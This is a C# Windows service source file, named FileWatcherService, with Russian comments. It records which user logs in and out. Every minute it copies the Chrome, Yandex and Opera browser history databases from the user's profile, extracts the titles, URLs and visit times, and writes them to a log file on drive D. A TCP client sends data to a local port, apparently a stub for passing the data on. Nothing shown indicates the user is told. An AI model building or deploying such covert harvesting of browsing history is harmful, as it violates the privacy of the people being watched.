using System;
using System.ServiceProcess;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Data.SQLite;
using System.Data.Common;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Security.Principal;
using WindowsMonitorService;
using System.Collections.ObjectModel;
using System.Collections;
using System.Management;
using Microsoft.Win32;
using System.Net.Sockets;

namespace FileWatcherService
{
    public partial class Service1 : ServiceBase
    {
        Logger logger;
        string UserName = String.Empty;
        public Service1()
        {
            InitializeComponent();



            this.CanStop = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;
            SystemEvents.SessionEnded += new SessionEndedEventHandler(SystemEvents_EventsThreadShutdown);
            this.CanHandleSessionChangeEvent = true;
        }

        private void SystemEvents_EventsThreadShutdown(object sender, SessionEndedEventArgs e)
        {
            using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
            {

                writer.WriteLine($"Выключил комп {this.UserName}!");


            }
        }

        protected override void OnSessionChange(SessionChangeDescription obj)
        {
            GetUserName();
        }


        private void GetUserName()
        {
            object obj = new object();

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem");
            ManagementObjectCollection collection = searcher.Get();
            string s = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split('\\')[1].Split('-').Last();


            if (UserName != s)
            {
                lock (obj)
                {
                    UserName = s;
                    using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                    {

                        writer.WriteLine($"{UserName} вошел в систему {DateTime.Now.ToString()}");

                    }
                }

            }

        }
        protected override void OnStart(string[] args)
        {
            GetUserName();
            logger = new Logger(UserName);
            logger.RecordEntry("Служба запущенна!", false);
            Thread loggerThread = new Thread(new ThreadStart(logger.Start));
            loggerThread.Start();
        }



        protected override void OnStop()
        {
            logger.Stop();
            logger.RecordEntry("Служба остановлена!");
        }
    }

    class Logger
    {

        const int port = 8888;
        const string address = "127.0.0.1";
        public string UserName { get; set; }
        object obj = new object();
        bool enabled = true;
        TcpClient client = null;

        public Logger(string name)
        {
            try
            {
                client = new TcpClient(address, port);
            }
            catch (Exception ex) { }
            UserName = name;
        }

        /// <summary>
        /// Копирование файла истории Opera
        /// </summary>
        private void copyHistoryOpera()
        {
            try
            {
                string opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        opera = Path.GetFullPath(f);

                    }
                }

                using (FileStream ms = new FileStream(opera, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyOpera.db", buffer);
                    //readHistory();
                }
                opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }

        /// <summary>
        /// Копирование файла истории Yandex
        /// </summary>
        private void copyHistoryYandex()
        {
            try
            {
                string yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";

                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        yandex = Path.GetFullPath(f);

                    }
                }

                using (FileStream ms = new FileStream(yandex, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyYandex.db", buffer);
                    //readHistory();
                }
                yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";

            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }




        /// <summary>
        /// Копирование файла истории Google
        /// </summary>
        private void copyHistoryGoogle()
        {
            try
            {

                string google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";

                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        google = Path.GetFullPath(f);

                    }
                }

                if (File.Exists("D:\\historyGoogle.db"))
                {
                    File.Delete("D:\\historyGoogle.db");
                }

                using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyGoogle.db", buffer);
                    ms.Close();
                    ms.Dispose();
                }
                google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";

            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }

        public void Start()
        {

            NetworkStream stream = client.GetStream();

            while (enabled)
            {
                try
                {
                    Thread.Sleep(60000);
                    copyHistoryGoogle();
                    ReadGoogleDataBase();
                    copyHistoryYandex();
                    ReadYandexDataBase();
                    copyHistoryOpera();
                    ReadOperaDataBase();

                    byte[] data = Encoding.Unicode.GetBytes("Пожалуйста, работай");
                    stream.Write(data, 0, data.Length);
                    
                    GC.Collect();
                }
                catch (Exception d)
                {
                    RecordEntry(d.Message);
                    RecordEntry(d.Source);
                }






            }
        }
        const string databaseName = @"D:\\historyGoogle.db";
        private void ReadGoogleDataBase()
        {
            try
            {

                if (File.Exists(databaseName))
                {

                    string lastTime = null;
                    string tmpPath = "D:\\tmpGoogle.txt";
                    if (lastTime == null)
                        lastTime = DateTime.Now.ToString();
                    if (File.Exists(tmpPath))
                    {

                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
                        {
                            // преобразуем строку в байты
                            byte[] array = new byte[f.Length];
                            // считываем данные
                            f.Read(array, 0, array.Length);
                            // декодируем байты в строку
                            lastTime = Encoding.Default.GetString(array);

                        }
                    }

                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
                    {

                        connection.Open();
                        StringBuilder stringBuilder = new StringBuilder();

                        DbDataReader r = null;

                        if (DateTime.Parse(lastTime) < DateTime.Now)
                        {

                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();

                        }
                        else
                        {

                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();

                        }
                        if (r.HasRows)
                        {

                            while (r.Read())
                            {
                                stringBuilder.Append("title:\t");
                                stringBuilder.Append(r.GetValue(2));
                                stringBuilder.Append("\turl:\t");
                                stringBuilder.Append(r.GetValue(1));
                                stringBuilder.Append("\tlast time:\t");
                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
                                stringBuilder.Append("\r\n\r");
                            }
                        }

                        //RecordEntry(stringBuilder.ToString());

                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
                        {
                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }




        const string YandexdatabaseName = @"D:\\historyYandex.db";
        private void ReadYandexDataBase()
        {
            try
            {

                if (File.Exists(YandexdatabaseName))
                {

                    string lastTime = null;
                    string tmpPath = "D:\\tmpYandex.txt";
                    if (lastTime == null)
                        lastTime = DateTime.Now.ToString();
                    if (File.Exists(tmpPath))
                    {

                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
                        {
                            // преобразуем строку в байты
                            byte[] array = new byte[f.Length];
                            // считываем данные
                            f.Read(array, 0, array.Length);
                            // декодируем байты в строку
                            lastTime = Encoding.Default.GetString(array);

                        }
                    }

                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={YandexdatabaseName};")))
                    {

                        connection.Open();
                        StringBuilder stringBuilder = new StringBuilder();

                        DbDataReader r = null;

                        if (DateTime.Parse(lastTime) < DateTime.Now)
                        {

                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();

                        }
                        else
                        {

                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();

                        }
                        if (r.HasRows)
                        {

                            while (r.Read())
                            {
                                stringBuilder.Append("title:\t");
                                stringBuilder.Append(r.GetValue(2));
                                stringBuilder.Append("\turl:\t");
                                stringBuilder.Append(r.GetValue(1));
                                stringBuilder.Append("\tlast time:\t");
                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
                                stringBuilder.Append("\r\n\r");
                            }
                        }

                        RecordEntry(stringBuilder.ToString());

                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
                        {
                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }



        const string OperadatabaseName = @"D:\\historyOpera.db";
        private void ReadOperaDataBase()
        {
            try
            {

                if (File.Exists(OperadatabaseName))
                {

                    string lastTime = null;
                    string tmpPath = "D:\\tmpOpera.txt";
                    if (lastTime == null)
                        lastTime = DateTime.Now.ToString();
                    if (File.Exists(tmpPath))
                    {

                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
                        {
                            // преобразуем строку в байты
                            byte[] array = new byte[f.Length];
                            // считываем данные
                            f.Read(array, 0, array.Length);
                            // декодируем байты в строку
                            lastTime = Encoding.Default.GetString(array);

                        }
                    }

                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={OperadatabaseName};")))
                    {

                        connection.Open();
                        StringBuilder stringBuilder = new StringBuilder();

                        DbDataReader r = null;

                        if (DateTime.Parse(lastTime) < DateTime.Now)
                        {

                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();

                        }
                        else
                        {

                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();

                        }
                        if (r.HasRows)
                        {

                            while (r.Read())
                            {
                                stringBuilder.Append("title:\t");
                                stringBuilder.Append(r.GetValue(2));
                                stringBuilder.Append("\turl:\t");
                                stringBuilder.Append(r.GetValue(1));
                                stringBuilder.Append("\tlast time:\t");
                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
                                stringBuilder.Append("\r\n\r");
                            }
                        }

                        RecordEntry(stringBuilder.ToString());

                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
                        {
                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }




        public void Stop()
        {

            enabled = false;
        }


        public void RecordEntry(string fileEvent, bool isError = true)
        {
            lock (obj)
            {
                using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                {
                    writer.WriteLine(String.Format("{0} под пользователем {1} {2}{3}",
                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, isError == true ? " произошла ошибка " : "", fileEvent));
                    writer.Flush();
                }
            }
        }
    }
}